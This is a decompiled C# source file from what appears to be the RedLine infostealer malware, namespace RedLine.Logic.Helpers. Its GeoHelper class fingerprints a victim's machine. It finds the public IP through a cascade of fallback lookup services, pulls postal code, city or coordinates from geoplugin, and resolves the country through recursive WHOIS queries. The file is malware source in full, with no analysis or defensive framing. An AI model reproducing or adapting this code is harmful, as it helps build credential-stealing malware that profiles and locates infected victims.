using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using RedLine.Logic.Extensions;
using RedLine.Logic.Json;
using RedLine.Models;

namespace RedLine.Logic.Helpers
{
	// Token: 0x0200005B RID: 91
	public static class GeoHelper
	{
		// Token: 0x0600029A RID: 666 RVA: 0x0000AAF0 File Offset: 0x00008CF0
		public static GeoInfo Get()
		{
			GeoInfo geoInfo = new GeoInfo();
			GeoInfo result;
			try
			{
				string text = string.Empty;
				string postalCode = string.Empty;
				try
				{
					postalCode = new WebClient().DownloadString("https://api.ip.sb/geoip").FromJSON()["postal_code"].ToString(false);
				}
				catch
				{
				}
				try
				{
					using (WebClient webClient = new WebClient())
					{
						byte[] bytes = webClient.DownloadData("http://checkip.amazonaws.com/");
						text = Encoding.UTF8.GetString(bytes).Trim();
					}
				}
				catch (Exception)
				{
				}
				if (string.IsNullOrEmpty(text))
				{
					try
					{
						text = new WebClient().DownloadString("https://ipinfo.io/ip").Replace("\n", "");
					}
					catch (Exception)
					{
					}
				}
				if (string.IsNullOrEmpty(text))
				{
					try
					{
						text = new WebClient().DownloadString("https://api.ipify.org").Replace("\n", "");
					}
					catch (Exception)
					{
					}
				}
				if (string.IsNullOrEmpty(text))
				{
					try
					{
						text = new WebClient().DownloadString("https://icanhazip.com").Replace("\n", "");
					}
					catch (Exception)
					{
					}
				}
				if (string.IsNullOrEmpty(text))
				{
					try
					{
						text = new WebClient().DownloadString("https://wtfismyip.com/text").Replace("\n", "");
					}
					catch (Exception)
					{
					}
				}
				if (string.IsNullOrEmpty(text))
				{
					try
					{
						text = new WebClient().DownloadString("http://bot.whatismyipaddress.com/").Replace("\n", "");
					}
					catch (Exception)
					{
					}
				}
				if (string.IsNullOrEmpty(text))
				{
					try
					{
						text = new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()).ReadToEnd().Trim().Split(new char[]
						{
							':'
						})[1].Substring(1).Split(new char[]
						{
							'<'
						})[0];
					}
					catch (Exception)
					{
					}
				}
				if (!string.IsNullOrWhiteSpace(text))
				{
					geoInfo.Country = GeoHelper.GetCountry(text);
				}
				geoInfo.PostalCode = postalCode;
				JsonValue jsonValue = new WebClient().DownloadString("http://www.geoplugin.net/json.gp?ip=" + text).FromJSON();
				try
				{
					if (string.IsNullOrWhiteSpace(text) || string.IsNullOrWhiteSpace(geoInfo.Country))
					{
						geoInfo.Country = GeoHelper.GetCountry(jsonValue["geoplugin_request"].ToString(false));
					}
				}
				catch
				{
				}
				geoInfo.IP = jsonValue["geoplugin_request"].ToString(false);
				geoInfo.Country = (geoInfo.Country ?? jsonValue["geoplugin_countryCode"].ToString(false));
				geoInfo.Location = ((jsonValue["geoplugin_city"].ToString(false) == "null") ? (jsonValue["geoplugin_latitude"].ToString(false) + ", " + jsonValue["geoplugin_longitude"].ToString(false)) : jsonValue["geoplugin_city"].ToString(false));
				result = geoInfo;
			}
			catch (Exception)
			{
				result = geoInfo;
			}
			return result;
		}

		// Token: 0x0600029B RID: 667 RVA: 0x0000AECC File Offset: 0x000090CC
		private static string GetWhoisInformation(string whoisServer, string url)
		{
			StringBuilder stringBuilder = new StringBuilder();
			BufferedStream stream = new BufferedStream(new TcpClient(whoisServer, 43).GetStream());
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.WriteLine(url);
			streamWriter.Flush();
			StreamReader streamReader = new StreamReader(stream);
			while (!streamReader.EndOfStream)
			{
				stringBuilder.AppendLine(streamReader.ReadLine());
			}
			return stringBuilder.ToString();
		}

		// Token: 0x0600029C RID: 668 RVA: 0x0000AF28 File Offset: 0x00009128
		private static string GetCountry(string ip)
		{
			string result;
			try
			{
				long ticks = DateTime.Now.Ticks;
				string text = string.Empty;
				string whoisServer = "whois.iana.org";
				Regex regex = new Regex("refer:(.*)");
				Regex regex2 = new Regex("country:(.*)");
				while (!text.Contains("country") && new TimeSpan(DateTime.Now.Ticks - ticks).TotalSeconds < 60.0)
				{
					text = GeoHelper.GetWhoisInformation(whoisServer, ip).Replace("        ", string.Empty);
					if (!regex.IsMatch(text))
					{
						return regex2.Match(text).Value.Split(new char[]
						{
							':'
						})[1].Trim().ToUpper();
					}
					whoisServer = regex.Match(text).Value.Split(new char[]
					{
						':'
					})[1].Trim().ToUpper();
				}
				result = null;
			}
			catch
			{
				result = null;
			}
			return result;
		}
	}
}
